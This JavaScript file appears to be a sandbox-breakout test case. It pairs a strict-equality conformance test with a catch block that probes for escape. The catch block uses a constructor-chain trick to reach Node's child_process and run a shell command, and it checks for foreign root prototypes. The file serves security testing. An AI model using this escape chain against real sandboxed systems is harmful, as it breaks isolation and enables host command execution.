try {
    if (1 === new Number(1)) {
        $ERROR('#1: 1 !== new Number(1)');
    }
    if (1 === true) {
        $ERROR('#2: 1 !== true');
    }
    if (1 === new Boolean(1)) {
        $ERROR('#3: 1 !== new Boolean(1)');
    }
    if (1 === '1') {
        $ERROR('#4: 1 !== "1"');
    }
    if (1 === new String(1)) {
        $ERROR('#5: 1 !== new String(1)');
    }
    if (new Number(0) === 0) {
        $ERROR('#6: new Number(0) !== 0');
    }
    if (false === 0) {
        $ERROR('#7: false !== 0');
    }
    if (new Boolean(0) === 0) {
        $ERROR('#8: new Boolean(0) !== 0');
    }
    if ('0' === 0) {
        $ERROR('#9: "0" !== 0');
    }
    if (new String(0) === 0) {
        $ERROR('#10: new String(0) !== 0');
    }
    if (1 === {
            valueOf: function () {
                return 1;
            }
        }) {
        $ERROR('#11: 1 === {valueOf: function () {return 1}}');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}